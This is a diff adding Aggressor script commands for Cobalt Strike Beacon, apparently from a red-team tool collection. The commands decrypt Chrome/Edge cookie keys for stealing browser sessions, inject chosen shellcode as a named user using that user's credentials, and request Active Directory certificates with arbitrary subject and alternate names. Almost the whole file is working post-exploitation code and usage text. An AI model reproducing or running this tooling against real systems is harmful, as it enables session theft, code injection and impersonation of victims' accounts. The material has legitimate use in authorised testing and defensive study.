+    "Decrypts the provided base64 encoded Chrome key",
+    "
+Command: chromeKey
+Summary: This command decrypts the provided base64 encoded Chrome key for use 
+         in decrypting cookies. If you get results, download the Cookies file 
+         from either google or modern edge.  An example Filepath is:
+  C:\\Users\\user\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cookies
+         You can feed the key and cookie file into Chlonium to decrypt the 
+         contents. Chlonium can be found here:
+         https://github.com/rxwx/chlonium
+
+Usage:   chromeKey
+"  
+);
+
+
+
+sub bshspawnas {
+    local('$bid $args $pass $username $domain $shellcode $shellcodelen $user $fp');
+
+    $bid = $1;
+    $domain = $2;
+    $username = $3;
+    $pass = $4;
+    if(-exists $5)
+    {
+        $shellcodelen = lof($5);
+        $fp = openf($5);
+        $shellcode = readb($fp, $shellcodelen);
+        closef($fp);
+    }
+    else
+    {
+        berror($bid, "Could not open file at path " . $5);
+        return;
+    }
+    $user = binfo($bid, "user");
+    if($user eq "SYSTEM *" || $user eq "SYSTEM")
+    {
+        berror($bid, "This function will not function properly as the system user");
+        return;
+    }
+    $args = bof_pack($bid, "ZZZb", $domain, $username, $pass, $shellcode);
+    beacon_inline_execute($bid, readbof($bid, 'shspawnas'), "go", $args);
+
+}
+
+alias shspawnas {
+    local('$shellcodepath $bid $username $pass $domain $ppid');
+    if(size(@_) < 4)
+    {
+        berror($1, "Incorrect argument count");
+        berror($1, beacon_command_detail('shspawnas'));
+        return;
+    }
+    $bid = $1;
+    $domain = $2;
+    $username = $3;
+    $pass = $4;
+    if(size(@_) == 4)
+    {
+        prompt_file_open("Select shellcode", $null, false, $this);
+        yield;
+        $shellcodepath = $1;
+    }
+    else
+    {
+        $shellcodepath = $5;
+    }
+
+    bshspawnas($bid, $domain, $username, $pass, $shellcodepath);
+}
+
+
+
+beacon_command_register(
+    'shspawnas',
+    'spawn / inject as specified user',
+    "usage: shspawnas <domain> <username> <password> <opt: shellcodefile>
+    If shellcode file is not provided a file browser will open so you can select it
+    use \"\" for domain to log into the local machine
+    Be aware the user you specify must be able to log into the machine interactivly and the login is recorded as such"
+);
+
+alias adcs_request {
+	local('$params $keys $args $adcs_request_ca $adcs_request_template $adcs_request_subject $adcs_request_altname $adcs_request_install $adcs_request_machine');
+
+	%params = ops(@_);
+	@keys = keys(%params);
+	
+	$adcs_request_ca = "";
+	$adcs_request_template = "";
+	$adcs_request_subject = "";
+	$adcs_request_altname = "";
+	$adcs_request_install = 0;
+	$adcs_request_machine = 0;
+	
+	if ("CA" in @keys) {
+		$adcs_request_ca = %params["CA"];
+	}
+    else {
+		berror($1, beacon_command_detail("adcs_request"));
+		berror($1, "Need to provide the Certificate Authority at a minimum");
+		return;
+    }
+    if ("TEMPLATE" in @keys) {
+        $adcs_request_template = %params["TEMPLATE"];
+    }
+    if ("SUBJECT" in @keys) {
+        $adcs_request_subject = %params["SUBJECT"];
+    }
+    if ("ALTNAME" in @keys) {
+        $adcs_request_altname = %params["ALTNAME"];
+    }
+    if ("INSTALL" in @keys) {
+        $adcs_request_install = 1;
+    }
+    if ("MACHINE" in @keys) {
+        $adcs_request_machine = 1;
+    }
+    
+	$args = bof_pack($1, "ZZZZss", $adcs_request_ca, $adcs_request_template, $adcs_request_subject, $adcs_request_altname, $adcs_request_install, $adcs_request_machine);
+	beacon_inline_execute($1, readbof($1, "adcs_request"), "go", $args);
+}
+
+beacon_command_register(
+	"adcs_request",
+	"Request an enrollment certificate",
+	"
+Command: adcs_request
+Summary: This command connects a certificate authority and requests an enrollment 
+         certificate of the specified type for the specified subject and alternative 
+         name. It will also optionally install the certificate for the current context.
+Usage:   adcs_request /CA:ca [/TEMPLATE:template] [/SUBJECT:subject] [/ALTNAME:altname] [/INSTALL] [/MACHINE]
+         CA        Required. The certificate authority to use.
+         TEMPLATE  Optional. The certificate type to request.
+         SUBJECT   Optional. The subject's distinguished name.
+         ALTNAME   Optional. The alternate subject's distinguished name.
+         INSTALL   Optional. Install the certificate in current context?
+         MACHINE   Optional. Request a certificate for a machine instead of a user?
+"
+);
